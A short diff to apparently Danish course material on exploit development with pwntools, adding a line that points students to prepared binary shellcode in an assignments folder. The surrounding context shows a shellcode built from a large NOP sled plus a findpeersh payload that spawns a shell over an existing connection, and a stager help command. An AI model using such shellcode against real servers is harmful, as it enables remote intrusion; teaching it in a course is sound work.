@@ -23,6 +23,8 @@ LARGE_SHELLCODE = asm(shellcraft.nop()) * 10000 +\
                   asm(shellcraft.findpeersh())
 ------------------------------------------------
 
+Eller I kan bruge den shellcode, jeg har lagt i 'assignments/WebServerShellcode' (i binær form).
+
 [source,bash]
 ------------------------------------------------
 $ shellcraft i386.linux.stager -?
